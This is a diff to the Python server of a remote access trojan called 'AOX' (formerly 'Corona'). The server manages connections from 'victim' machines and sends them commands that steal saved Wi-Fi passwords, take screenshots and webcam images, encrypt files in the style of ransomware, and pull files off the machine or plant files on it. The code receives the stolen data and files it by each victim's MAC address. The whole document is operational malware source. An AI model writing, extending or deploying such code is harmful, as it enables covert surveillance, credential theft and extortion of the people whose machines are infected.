@@ -16,31 +16,30 @@ from sqlite_handler import SqlHandler
 
 class AOXServer:
 
-    def __init__(self, host, port, client_folder):
+    def __init__(self, host, port, client_folder, client_database, database_table_name):
         self.sock = None
         self.host = host
         self.port = port
         self.client_conn_dict = {}
         self.client_folder = client_folder
-        self.sql_handler = SqlHandler("ClientDB.db", "clientDetails")
-
+        self.sql_handler = SqlHandler(client_database, database_table_name)
 
 
 
     def print_guide(self):
         user_guide = """
-        Corona Shell Commands
-                 'list':['lists all active connections']
-                 'select (target Client_ID)':['selects a target and creates a session between the server and the client machine ']
-                 'guide': Display Corona's user commands
+        AOX Shell Commands
+                 'connected':['display all active connections']
+                 'shell (target Client_ID)':['selects a target and creates a session between the server and the client machine ']
+                 'guide': Display AOX user commands
         Client Commands
                 'quit':['quits the session and takes user back to the Corona shell interface']
-                'wifi_passwords':['gets all known wifi password that the client node has ever connected to'],
-                'screenshot':['takes a screen shot of the client machine'],
-                'camshot':['captures an image from the client's webcam'],
-                'encrypt (password) (directory)':[encrypts all files in the directory specified'] [if directory is not specified all files in the current directory will be encrypted],
-                'decrypt (password) (directory)':['decrypts all files in the directory specified'] [if directory is not specified all files in the current directory will be decrypted],
-                'get (filename or path)':['gets file from the victim's machine and sends it over to the server'],
+                'wifi_passwords':['gets all known wifi password that the client node has ever connected to']
+                'screenshot':['takes a screen shot of the client machine']
+                'camshot':['captures an image from the client's webcam']
+                'encrypt (password)':[encrypts all files in the current directory']
+                'decrypt (password)':['decrypts all files in the current directory']
+                'get (filename or path)':['gets file from the victim's machine and sends it over to the server']
                 'send (filename or path)':['send file from server and stores it on the victim's machine']
         """
         print(user_guide)
@@ -112,11 +111,11 @@ class AOXServer:
         filename = client_conn.recv(1024).decode()
         filepath = os.path.join(self.client_folder, mac_address, filename)
         with open( f"{filepath}.jpg", 'wb') as file:
-            fileSize = int(client_conn.recv(1024).decode())#accept and decode image file size
+            fileSize = int(client_conn.recv(1024).decode())
             time.sleep(1)
-            data = client_conn.recv(1024) #accept and decode length of data received
+            data = client_conn.recv(1024)
             totalFileRecv = len(data)
-            #recieve all data until there no more data to receive
+            
             while totalFileRecv < fileSize:
                 totalFileRecv += len(data)
                 file.write(data)
@@ -128,9 +127,7 @@ class AOXServer:
 
     # Sends file from server to victim's machine
     def send_file(self, conn, usrFile):
-        # Check if usrFile is a file
         if os.path.isfile(usrFile):
-            # Check if file exists
             if not os.path.exists(usrFile):
                 print("[-]File does not exist!")
                 conn.send(str(0).encode()) 
@@ -153,7 +150,6 @@ class AOXServer:
                                 data = file.read(1024)
                             file.close()
                         print("[+] Data sent!!!")
-        # Check if usrFile is a directory
         elif os.path.isdir(usrFile):
             print(f"[-]{usrFile} is a directory, not a file!")
             conn.send(str(0).encode())
@@ -167,7 +163,6 @@ class AOXServer:
     # recieves file from victim's machine
     def receive_file(self, conn, mac_address, usrFile):
         filepath = os.path.join(self.client_folder, mac_address, usrFile)
-
         fileSize = int(conn.recv(1024).decode())
         if fileSize == 0:
             print("File is empty!!!")
@@ -195,60 +190,78 @@ class AOXServer:
     def client_session(self, client_id, client_conn):
         self.send_null(client_conn)
         while True:
-            cmd = input()
-            if cmd == 'quit':
-                print("[+]Closing Session....")
-                break
+            try:
+                cmd = input()
+                if cmd == 'quit':
+                    print("[+]Closing Session....")
+                    break
 
-            elif cmd == "":
-                self.send_null(client_conn)
+                elif cmd == "":
+                    self.send_null(client_conn)
 
-            elif cmd.startswith("get"):
-                client_conn.send(str(cmd).encode())
-                filename = cmd.split()[-1]
-                data = client_conn.recv(1024).decode()
-                if "File does not exist" in data:
-                    print(str(data), end="")
-                elif "not a file" in data:
-                    print(str(data), end="")
-                elif "is not a regular file" in data:
-                    print(str(data), end="")
-                else:
-                    self.receive_file(client_conn, self.sql_handler.get_mac_address(client_id), filename)
-                    print(str(data), end="")
+                elif cmd == "guide":
+                    self.print_guide()
 
-            elif cmd.startswith("send"):
-                filepath = str(cmd.split()[-1])
-
-                if os.path.isabs(filepath):
+                elif cmd.startswith("get"):
                     client_conn.send(str(cmd).encode())
-                    self.send_file(client_conn, filepath)
+                    filename = cmd.split()[-1]
+                    data = client_conn.recv(1024).decode()
+                    if "File does not exist" in data:
+                        print(str(data), end="")
+                    elif "not a file" in data:
+                        print(str(data), end="")
+                    elif "is not a regular file" in data:
+                        print(str(data), end="")
+                    else:
+                        self.receive_file(client_conn, self.sql_handler.get_mac_address(client_id), filename)
+                        print(str(data), end="")
+
+                elif cmd.startswith("send"):
+                    filepath = str(cmd.split()[-1])
+
+                    if os.path.isabs(filepath):
+                        client_conn.send(str(cmd).encode())
+                        self.send_file(client_conn, filepath)
+                        data = client_conn.recv(1024).decode()
+                        print(str(data), end="")
+                    else:
+                        print("[-]You must provide an absolue path for the file you want to send!")
+
+                elif "screenshot" in cmd:
+                    client_conn.send(str(cmd).encode())
+                    data = client_conn.recv(1024).decode()
+                    self.receive_client_image(self.sql_handler.get_mac_address(client_id), client_conn)
+                    print(str(data), end="")
+
+                elif "camshot" in cmd:
+                    client_conn.send(str(cmd).encode())
+                    data = client_conn.recv(1024).decode()
+                    self.receive_client_image(self.sql_handler.get_mac_address(client_id), client_conn)
+                    print(str(data), end="")
+
+                elif cmd == "wifi_passwords":
+                    client_conn.send(str(cmd).encode())
+                    data = client_conn.recv(65536).decode()
+                    print(str(data), end="")
+
+                elif "encrypt" in cmd:
+                    client_conn.send(str(cmd).encode())
+                    data = client_conn.recv(1024).decode()
+                    print(str(data), end="")
+
+                elif "decrypt" in cmd:
+                    client_conn.send(str(cmd).encode())
                     data = client_conn.recv(1024).decode()
                     print(str(data), end="")
                 else:
-                    print("[-]You must provide an absolue path for the file you want to send!")
+                    client_conn.send(str(cmd).encode())
+                    data = client_conn.recv(65536).decode()
+                    print(str(data), end="")
 
-            elif "screenshot" in cmd:
-                client_conn.send(str(cmd).encode())
-                data = client_conn.recv(1024).decode()
-                self.receive_client_image(self.sql_handler.get_mac_address(client_id), client_conn)
-                print(str(data), end="")
-
-            elif "camshot" in cmd:
-                client_conn.send(str(cmd).encode())
-                data = client_conn.recv(1024).decode()
-                self.receive_client_image(self.sql_handler.get_mac_address(client_id), client_conn)
-                print(str(data), end="")
-
-            elif cmd == "wifi_passwords":
-                client_conn.send(str(cmd).encode())
-                data = client_conn.recv(65536).decode()
-                print(str(data), end="")
-
-            else:
-                client_conn.send(str(cmd).encode())
-                data = client_conn.recv(65536).decode()
-                print(str(data), end="")
+            except Exception as e:
+                    print("[-]Connection terminated!!!")
+                    print(e)
+                    break
               
 
 
@@ -266,18 +279,21 @@ class AOXServer:
             if cmd == '':
                 pass
             elif cmd == 'connected':
-                print(self.client_conn_dict)
                 self.sql_handler.get_connected_client_info(self.client_conn_dict)
             elif cmd == 'guide':
                 self.print_guide()
-            elif 'select' in cmd and len(cmd.split()) == 2:
+            elif 'shell' in cmd and len(cmd.split()) == 2:
                 client_id = cmd.split()[1].strip()
                 mac_address = self.sql_handler.get_mac_address(client_id)
                 if not mac_address:
                     print("[-]Client ID does not exist!!")
                 else:
-                    client_conn = self.get_target_client(mac_address)
-                    self.client_session(client_id, client_conn)
+                    try:
+                        client_conn = self.get_target_client(mac_address)
+                        self.client_session(client_id, client_conn)
+                    except:
+                        self.sql_handler.remove_client_by_mac(mac_address)
+                        print("[-]Client connection is not active!")
             else:
                 print("[-]Invalid command!!!")
 
@@ -288,6 +304,4 @@ class AOXServer:
         self.sql_handler.create_database()
         thread2 = threading.Thread(target=self.accept_connections, daemon=True)
         thread2.start()
-
         self.main()
-
